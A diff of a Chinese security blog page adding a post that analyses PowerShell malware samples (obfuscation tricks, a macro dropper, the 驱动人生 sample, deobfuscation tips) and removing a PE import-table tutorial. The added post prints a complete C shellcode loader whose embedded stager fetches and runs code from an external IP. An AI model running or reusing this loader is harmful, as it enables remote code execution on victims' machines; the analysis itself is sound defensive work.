@@ -440,6 +440,181 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/01/样本分析之Powershell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findream">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="findream's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/01/样本分析之Powershell/" itemprop="url">样本分析之Powershell</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-01T15:02:11+08:00">
+                2019-07-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/windows系统/" itemprop="url" rel="index">
+                    <span itemprop="name">windows系统</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<h1 id="0x1-常见混淆"><a href="#0x1-常见混淆" class="headerlink" title="0x1 常见混淆"></a>0x1 常见混淆</h1><ul>
+<li>基于大小写 ：hacky—&gt;HaCky</li>
+<li>基于字符分割：’Ha’+’Cky’—&gt;HaCky</li>
+<li>插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&gt;HaCky</li>
+<li>反引号：H`aCky—&gt;HaCky</li>
+<li>基于命令转换(字符串转化为命令)&amp;(HaCky)—&gt;HaCky</li>
+<li>基于空格或者ASCII</li>
+</ul>
+<h1 id="0x2-勒索软件"><a href="#0x2-勒索软件" class="headerlink" title="0x2 勒索软件"></a>0x2 勒索软件</h1><ul>
+<li>解混淆能清除发现是AES加密<br>  <img src="http://hacky.wang/blog/20190629/XqfP84ygBUqt.png?imageslim" alt="mark"></li>
+</ul>
+<h1 id="0x3-流量欺骗"><a href="#0x3-流量欺骗" class="headerlink" title="0x3 流量欺骗"></a>0x3 流量欺骗</h1><ul>
+<li>1.宏病毒释放处宏代码，如文件macro.vbs，查看宏代码，发现一段base64编码之后的数据，然后调用powershell执行，怀疑是一个powershell脚本</li>
+<li>2.通过解base得到一个ps1脚本代码，命名为ByPowershell.ps1</li>
+<li>3.通过分析，可以发现ByPowershell.ps1，利用powershell执行了一次-nop -noni -enc 命令，目的在于隐秘执行<br>  <img src="http://hacky.wang/blog/20190626/0rstQItBCLi5.png?imageslim" alt="mark"></li>
+<li>4.解base64编码，得到FromPowershell.ps1_,可以观察到是利用利用virtuallAlloc执行shellcode</li>
+<li>如果发现ps1脚本里面有shellcode，只需要用C语言内联shellcode字节，然后调试即可。如下是shellcode利用脚本<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span>(<span class="params"><span class="keyword">void</span></span>)</span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	printf(<span class="string">"hhhhh\n"</span>);</div><div class="line">	<span class="keyword">char</span> shellcode[] = &#123;<span class="string">'\xfc'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x82'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x60'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe5'</span>,<span class="string">'\x31'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x64'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x50'</span>,<span class="string">'\x30'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x0c'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x14'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x72'</span>,<span class="string">'\x28'</span>,<span class="string">'\x0f'</span>,<span class="string">'\xb7'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x26'</span>,<span class="string">'\x31'</span>,<span class="string">'\xff'</span>,<span class="string">'\xac'</span>,<span class="string">'\x3c'</span>,<span class="string">'\x61'</span>,<span class="string">'\x7c'</span>,<span class="string">'\x02'</span>,<span class="string">'\x2c'</span>,<span class="string">'\x20'</span>,<span class="string">'\xc1'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x0d'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc7'</span>,<span class="string">'\xe2'</span>,<span class="string">'\xf2'</span>,<span class="string">'\x52'</span>,<span class="string">'\x57'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x52'</span>,<span class="string">'\x10'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x3c'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x11'</span>,<span class="string">'\x78'</span>,<span class="string">'\xe3'</span>,<span class="string">'\x48'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd1'</span>,<span class="string">'\x51'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x59'</span>,<span class="string">'\x20'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x49'</span>,<span class="string">'\x18'</span>,<span class="string">'\xe3'</span>,<span class="string">'\x3a'</span>,<span class="string">'\x49'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x34'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd6'</span>,<span class="string">'\x31'</span>,<span class="string">'\xff'</span>,<span class="string">'\xac'</span>,<span class="string">'\xc1'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x0d'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc7'</span>,<span class="string">'\x38'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x75'</span>,<span class="string">'\xf6'</span>,<span class="string">'\x03'</span>,<span class="string">'\x7d'</span>,<span class="string">'\xf8'</span>,<span class="string">'\x3b'</span>,<span class="string">'\x7d'</span>,<span class="string">'\x24'</span>,<span class="string">'\x75'</span>,<span class="string">'\xe4'</span>,<span class="string">'\x58'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x58'</span>,<span class="string">'\x24'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x66'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x0c'</span>,<span class="string">'\x4b'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x58'</span>,<span class="string">'\x1c'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd3'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x04'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x01'</span>,<span class="string">'\xd0'</span>,<span class="string">'\x89'</span>,<span class="string">'\x44'</span>,<span class="string">'\x24'</span>,<span class="string">'\x24'</span>,<span class="string">'\x5b'</span>,<span class="string">'\x5b'</span>,<span class="string">'\x61'</span>,<span class="string">'\x59'</span>,<span class="string">'\x5a'</span>,<span class="string">'\x51'</span>,<span class="string">'\xff'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x5a'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x12'</span>,<span class="string">'\xeb'</span>,<span class="string">'\x8d'</span>,<span class="string">'\x5d'</span>,<span class="string">'\x68'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x65'</span>,<span class="string">'\x74'</span>,<span class="string">'\x00'</span>,<span class="string">'\x68'</span>,<span class="string">'\x77'</span>,<span class="string">'\x69'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x69'</span>,<span class="string">'\x54'</span>,<span class="string">'\x68'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x77'</span>,<span class="string">'\x26'</span>,<span class="string">'\x07'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x31'</span>,<span class="string">'\xdb'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x3a'</span>,<span class="string">'\x56'</span>,<span class="string">'\x79'</span>,<span class="string">'\xa7'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x03'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\xbb'</span>,<span class="string">'\x01'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\xe8'</span>,<span class="string">'\xa7'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x2f'</span>,<span class="string">'\x4c'</span>,<span class="string">'\x37'</span>,<span class="string">'\x6c'</span>,<span class="string">'\x37'</span>,<span class="string">'\x46'</span>,<span class="string">'\x38'</span>,<span class="string">'\x51'</span>,<span class="string">'\x73'</span>,<span class="string">'\x64'</span>,<span class="string">'\x71'</span>,<span class="string">'\x4f'</span>,<span class="string">'\x68'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x36'</span>,<span class="string">'\x43'</span>,<span class="string">'\x53'</span>,<span class="string">'\x39'</span>,<span class="string">'\x32'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x6b'</span>,<span class="string">'\x35'</span>,<span class="string">'\x41'</span>,<span class="string">'\x4a'</span>,<span class="string">'\x58'</span>,<span class="string">'\x57'</span>,<span class="string">'\x54'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x70'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x75'</span>,<span class="string">'\x4d'</span>,<span class="string">'\x6e'</span>,<span class="string">'\x66'</span>,<span class="string">'\x48'</span>,<span class="string">'\x00'</span>,<span class="string">'\x50'</span>,<span class="string">'\x68'</span>,<span class="string">'\x57'</span>,<span class="string">'\x89'</span>,<span class="string">'\x9f'</span>,<span class="string">'\xc6'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x89'</span>,<span class="string">'\xc6'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x32'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x84'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x57'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\xeb'</span>,<span class="string">'\x55'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x3b'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x96'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x0a'</span>,<span class="string">'\x5f'</span>,<span class="string">'\x68'</span>,<span class="string">'\x80'</span>,<span class="string">'\x33'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe0'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x04'</span>,<span class="string">'\x50'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x1f'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x75'</span>,<span class="string">'\x46'</span>,<span class="string">'\x9e'</span>,<span class="string">'\x86'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x2d'</span>,<span class="string">'\x06'</span>,<span class="string">'\x18'</span>,<span class="string">'\x7b'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x75'</span>,<span class="string">'\x08'</span>,<span class="string">'\x4f'</span>,<span class="string">'\x75'</span>,<span class="string">'\xd9'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x4b'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x40'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x10'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x40'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\x68'</span>,<span class="string">'\x58'</span>,<span class="string">'\xa4'</span>,<span class="string">'\x53'</span>,<span class="string">'\xe5'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x93'</span>,<span class="string">'\x53'</span>,<span class="string">'\x53'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe7'</span>,<span class="string">'\x57'</span>,<span class="string">'\x68'</span>,<span class="string">'\x00'</span>,<span class="string">'\x20'</span>,<span class="string">'\x00'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\x56'</span>,<span class="string">'\x68'</span>,<span class="string">'\x12'</span>,<span class="string">'\x96'</span>,<span class="string">'\x89'</span>,<span class="string">'\xe2'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x74'</span>,<span class="string">'\xcf'</span>,<span class="string">'\x8b'</span>,<span class="string">'\x07'</span>,<span class="string">'\x01'</span>,<span class="string">'\xc3'</span>,<span class="string">'\x85'</span>,<span class="string">'\xc0'</span>,<span class="string">'\x75'</span>,<span class="string">'\xe5'</span>,<span class="string">'\x58'</span>,<span class="string">'\xc3'</span>,<span class="string">'\x5f'</span>,<span class="string">'\xe8'</span>,<span class="string">'\x77'</span>,<span class="string">'\xff'</span>,<span class="string">'\xff'</span>,<span class="string">'\xff'</span>,<span class="string">'\x31'</span>,<span class="string">'\x33'</span>,<span class="string">'\x38'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x31'</span>,<span class="string">'\x32'</span>,<span class="string">'\x38'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x31'</span>,<span class="string">'\x39'</span>,<span class="string">'\x36'</span>,<span class="string">'\x2e'</span>,<span class="string">'\x38'</span>,<span class="string">'\x34'</span>,<span class="string">'\x00'</span>,<span class="string">'\xbb'</span>,<span class="string">'\xf0'</span>,<span class="string">'\xb5'</span>,<span class="string">'\xa2'</span>,<span class="string">'\x56'</span>,<span class="string">'\x6a'</span>,<span class="string">'\x00'</span>,<span class="string">'\x53'</span>,<span class="string">'\xff'</span>,<span class="string">'\xd5'</span>&#125;;</div><div class="line">	DWORD oldProtect = <span class="number">0</span>;</div><div class="line">	VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE,&amp;oldProtect);</div><div class="line">	((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))&amp;shellcode)();</div><div class="line">	VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), oldProtect, &amp;oldProtect);</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="0x4-驱动人生样本"><a href="#0x4-驱动人生样本" class="headerlink" title="0x4 驱动人生样本"></a>0x4 驱动人生样本</h1><ul>
+<li>1.得到样本g123.ps1，<code>Invoke-Expression</code>是一个可以将变量(字符串)当成可以执行的语句。正常情况下如果有此语句是不能显示代码语句的，但是我们可以使用<code>Write-Host</code>打印代码。在powershell中执行g123.ps1。可以发现代码被严重混淆。将其重定向输出成1.ps1即可<br>  <img src="http://hacky.wang/blog/20190629/E7015YVIThF9.png?imageslim" alt="mark"></li>
+<li>2.但是仍然发现代码被混淆严重，但是可以发现代码的一些蛛丝马迹。看代码最后一行。它其中是以. (表达式)(表达式)来执行的。可以联想到Invoke-Expression。看到在&amp; ((GV ‘<em>mDr</em>‘).nAME[3,11,2]-joiN’’)之前有个管道符。使用<code>Out-File .\tmp.log</code>重定向即可。得到2.ps1<br>  <img src="http://hacky.wang/blog/20190629/3aIiKnEUJr3L.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190629/7Vgnc0a8TVuQ.png?imageslim" alt="mark"></li>
+<li>2.ps1和1.ps1是一样的。使用<code>Out-File .\tmp.log</code>解决，得到3.ps1.</li>
+<li>3.3.ps1换了一种混淆方式，但是处理是一样的。 <code>($sHELLiD[1]+$ShelLiD[13]+&#39;X&#39;)</code>可以猜测是IEX。解混淆得到4.ps1.<br>  <img src="http://hacky.wang/blog/20190629/uGmvm4Po1BuL.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20190629/FHPzGfssxIKj.png?imageslim" alt="mark"><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2></li>
+<li>遇到混淆了的powershell，除了常规的字符替换之类的方法，还有三种方法可以解混淆。<ul>
+<li>1.遇上Base64加密的，可以将<code>Invoke-Expression</code>修改为<code>Write-Host</code>即可。</li>
+<li>2.出现在结尾的IEX字段，这时候，可以利用输出重定向，使用<code>Out-File .\tmp.log</code>.<strong>重点是查看是否有管道符</strong></li>
+<li>3.出现在起始部分IEX字段，例如<code>. ( $EnV:CoMsPec[4,26,25]-JoIN&#39;&#39;)(((&#39;[string]3CHav = U&#39;+&#39;ABUAB[string]....</code>。只需要修改语句为<code>Write-Host</code>即可。</li>
+</ul>
+</li>
+<li>备注：解混淆需要活学活用。重点是寻找<code>Invoke-Expression</code>字段</li>
+<li>参考：<a href="https://paper.seebug.org/826/" target="_blank" rel="external">https://paper.seebug.org/826/</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/30/病毒分析技术_21_针对KingSqlZ组织一次攻击的分析报告/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -863,196 +1038,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/18/一篇文章带你理解PE三表/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="findream">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="findream's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/04/18/一篇文章带你理解PE三表/" itemprop="url">一篇文章带你理解PE三表</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-18T15:02:11+08:00">
-                2019-04-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/windows安全/" itemprop="url" rel="index">
-                    <span itemprop="name">windows安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;刚刚结束春招，投了好几家公司，结果不是很理想，原因无外乎自身实力和行业寒冬。</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这次春招面试题主要集中在PE相关，HOOK技术和DLL注入技术，还有一些杂七杂八的问题上面。从中也暴露处自己技能栈上的不足，通过这一段时间的沉淀希望可以补足。</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;四月初就开始谋划写一系列的文章，但是加上在校实习比较忙碌，所以进展很慢，这些文章主要面向受众是那些入坑新人，借此希望能够让那些小伙伴能够少走弯路。同时也能多多总结自身的不足，共同进步。</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这系列文章取啥名？想了很久，决定参考某一师傅的系列文章—&lt;一篇文章带你·····&gt;,主要希望总结PE文件，HOOK,DLL注入，以及其他方面的知识，主要的参考文献是看雪<strong>加密解密第四版</strong>，以及其他资料。(打了广告，希望相关师傅记得打点广告费)</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这系列是我边总结技术边写文章，可能部分内容会以后补全技能栈，例如R0下的DLL注入等。<strong>但是尽量做到不鸽</strong>，关于代码，不提供自己写的代码，原因有二，第一，这些代码网上都有现成的，我只是理解修改部分罢了，也怕自己的代码误导小伙伴们。<strong>第二，拒绝伸手党</strong>。</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于自身能力有限，文章中难免出现错误，希望各位师傅少喷我。</p>
-<h1 id="0x1-PE导入表"><a href="#0x1-PE导入表" class="headerlink" title="0x1 PE导入表"></a>0x1 PE导入表</h1><h2 id="0x1-1-输入函数的调用"><a href="#0x1-1-输入函数的调用" class="headerlink" title="0x1.1 输入函数的调用"></a>0x1.1 输入函数的调用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DLL动态链接库文件主要实现代码的复用。当一个程序调用DLL文件中的数据和代码的时候，有两种链接方式，第一种是<strong>隐式链接</strong>，这个过程是由windows装载器完成的，另外一种是<strong>显式链接</strong>，通过使用LoadLibrary和GetProcAddress这两个API函数实现的。</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当隐式的调用一个API函数的时候，同样也存在类似于LoadLibrary和GetProcAddress函数的功能实现，但是，这个操作是由windows装载器完成的，所以称为<strong>隐式链接</strong>，当程序使用隐式链接调用DLL代码的时候，装载器需要完成以下几个步骤(IAT填充):</p>
-<ul>
-<li>首先将所需要的DLL文件载入内存，Kernel32.dll等是通过映射的方式载入的</li>
-<li>定位IID，寻找IID的第四个字段Name。</li>
-<li>接着根据OrginalFirstThunk指向，获取INT。</li>
-<li>根据INT执行的IMAGE_IMPORT_BY_NAME结构获取函数名称</li>
-<li>利用类似于GetProcAddress函数功能的操作，获取函数地址VA</li>
-<li>将获取的API函数地址填充入IAT。</li>
-<li>断链，将FirstThunk断开</li>
-</ul>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序一般使用CALL-JMP的方式调用API方式，显然，这种方式是低效的，不然直接使用CALL高效，之所以使用这种方式，因为编译器无法判断哪些调用是API，哪些调用是普通函数。JMP的地址其实是IAT所在的地址VA。</p>
-<h2 id="0x1-2-导入表结构"><a href="#0x1-2-导入表结构" class="headerlink" title="0x1.2 导入表结构"></a>0x1.2 导入表结构</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在PE文件可选头中，数据目录项的第一个成员指向的导入表。可以看到2040是一个RVA，这是在内存中的偏移量。我们需要将它转化为文件偏移。<br>    <img src="https://ws3.sinaimg.cn/large/005BYqpgly1g26qg7gjykj30ik01rq2p.jpg" alt=""></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们可以看到2040位于.rdata段中。可以使用公式<strong>section[i].PointOfRawData+(offset-VirtuallAddress)</strong>来计算文件偏移。计算出来的文件偏移为600+(2040-2000)=640.也就是说PE导入表在文件中640H的地方。<br>    <img src="https://i.loli.net/2019/04/18/5cb8139b7a014.png" alt=""></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样的，我们可以使用代码实现这一个需求，代码如下：</p>
-<ul>
-<li>0.定位第一个节区地址</li>
-<li>1.获取节区数目</li>
-<li>2.判断RVA在那个节区</li>
-<li>3.计算:section[i].PointOfRawData+(offset-VirtuallAddress)<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">DWORD RvaToOffset(DWORD ImageAddr, LPVOID lpBaseAddress)</div><div class="line">&#123;</div><div class="line">	<span class="regexp">//</span>NtHeader</div><div class="line">	PIMAGE_NT_HEADERS pNtHeaders = <span class="function"><span class="params">(PIMAGE_NT_HEADERS)((ULONG_PTR)lpBaseAddress + ((PIMAGE_DOS_HEADER)lpBaseAddress)-&gt;e_lfanew)</span>;</span></div><div class="line"><span class="function">	//获取第一个节区的RawtoData</span></div><div class="line"><span class="function">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="params">(PIMAGE_SECTION_HEADER)(((ULONG_PTR)&amp;pNtHeaders-&gt;OptionalHeader) + pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader)</span>;</span></div><div class="line"><span class="function">	if <span class="params">(ImageAddr &gt; pNtHeaders-&gt;OptionalHeader.SizeOfImage)</span></span></div><div class="line"><span class="function">	&#123;</span></div><div class="line"><span class="function">		printf<span class="params">(<span class="string">"ImageAddr Is Error\n"</span>)</span>;</span></div><div class="line"><span class="function">		return NULL;</span></div><div class="line"><span class="function">	&#125;</span></div><div class="line"><span class="function">	if <span class="params">(ImageAddr &lt; pSectionHeader[<span class="number">0</span>].PointerToRawData)</span></span></div><div class="line"><span class="function">	&#123;</span></div><div class="line"><span class="function">		return ImageAddr;</span></div><div class="line"><span class="function">	&#125;</span></div><div class="line"><span class="function">	DWORD i = 0;</span></div><div class="line"><span class="function">	for <span class="params">(i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++)</span></span></div><div class="line"><span class="function">	&#123;</span></div><div class="line"><span class="function">		//节区下限</span></div><div class="line"><span class="function">		DWORD lower = pSectionHeader[i].VirtualAddress;</span></div><div class="line"><span class="function">		//节区上线</span></div><div class="line"><span class="function">		DWORD maxer = pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize；</span></div><div class="line"><span class="function">		if <span class="params">(ImageAddr &gt;= lower &amp;&amp; ImageAddr &lt;= maxer)</span></span></div><div class="line"><span class="function">		&#123;</span></div><div class="line"><span class="function">			return pSectionHeader[i].PointerToRawData + <span class="params">(ImageAddr - pSectionHeader[i].VirtualAddress)</span>;</span></div><div class="line"><span class="function">		&#125;</span></div><div class="line"><span class="function">	&#125;</span></div><div class="line"><span class="function">&#125;</span></div><div class="line"><span class="function">``` </span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这时候，我们需要用到新的知识IMAGE_IMPORT_DIRECTORY结构。简称IID。**IID结构对应着一个被隐式链接的DLL**，每个IID的结束标志为NULL。关于IID结构：</span></div></pre></td></tr></table></figure>
-</li>
-</ul>
